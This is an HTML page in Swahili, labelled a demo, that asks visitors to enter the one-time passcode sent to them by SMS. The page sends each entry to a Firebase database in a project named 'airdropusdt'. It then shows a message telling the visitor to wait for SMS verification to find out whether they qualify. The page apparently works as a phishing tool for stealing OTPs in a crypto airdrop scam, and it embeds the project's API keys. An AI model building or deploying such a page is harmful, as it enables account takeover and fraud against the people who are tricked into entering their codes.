    <!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ukurasa wa Demo</title>

<style>
  body {
    margin:0;
    font-family:Arial, sans-serif;
    background:#0a3d2a;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
  }

  .card {
    background:rgba(255,255,255,0.1);
    padding:20px;
    border-radius:10px;
    width:90%;
    max-width:400px;
    text-align:center;
  }

  input {
    width:90%;
    padding:12px;
    margin-top:12px;
    border:none;
    border-radius:8px;
    font-size:16px;
  }

  button {
    width:90%;
    margin-top:15px;
    padding:12px;
    background:#00ff88;
    border:none;
    color:#003300;
    font-weight:bold;
    font-size:16px;
    border-radius:8px;
    cursor:pointer;
  }

  .overlay {
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.55);
    display:none;
    align-items:center;
    justify-content:center;
  }

  .popup {
    position:fixed;
    bottom:30px;
    left:50%;
    transform:translateX(-50%);
    background:#fff;
    color:#000;
    padding:15px 25px;
    border-radius:10px;
    display:none;
    font-weight:bold;
    box-shadow:0 0 10px rgba(0,0,0,0.4);
  }

  .spinner {
    width:60px;
    height:60px;
    border:6px solid rgba(255,255,255,0.2);
    border-top-color:white;
    border-radius:50%;
    animation:spin 1s linear infinite;
  }

  @keyframes spin { to { transform:rotate(360deg);} }
</style>
</head>

<body>

<div class="card">
  <h2>Ukurasa wa mwisho</h2>
  <p>Ingiza OTP uliyopokea kwenye sms.</p>

  <input id="demoInput" type="text" placeholder="Ingiza otp hapa..." />
  <button id="submitBtn">Endelea</button>
</div>

<div id="loading" class="overlay">
  <div class="spinner"></div>
</div>

<div id="popup" class="popup">
  Tafadhali subiri uthibitisho wa SMS ili kujua kama umehitimu.
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
  // Firebase config yako
  const firebaseConfig = {    
      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",    
      authDomain: "airdropusdt-767d7.firebaseapp.com",    
      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",    
      projectId: "airdropusdt-767d7",    
      storageBucket: "airdropusdt-767d7.firebasestorage.app",    
      messagingSenderId: "627616603037",    
      appId: "1:627616603037:web:63041f067800c97fab6d74",    
      measurementId: "G-01F6G2CYXK"    
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  const popup = document.getElementById("popup");
  const btn = document.getElementById("submitBtn");

  btn.addEventListener("click", () => {
    let value = document.getElementById("demoInput").value.trim();

    if(!value){
      alert("Tafadhali ingiza OTP kwanza.");
      return;
    }

    // Hifadhi kwenye Firebase
    db.ref("maingizoreal").push({
      maandishi: value,
      muda: new Date().toISOString()
    })
    .then(() => {
      // Onyesha popup ya Kiswahili bila redirect
      popup.style.display = "block";

      // Ficha popup baada ya sekunde 3
      setTimeout(() => {
        popup.style.display = "none";
      }, 3000);
    })
    .catch(err => {
      alert("Kuna hitilafu wakati wa kuhifadhi: " + err.message);
    });
  });
</script>

</body>
</html>
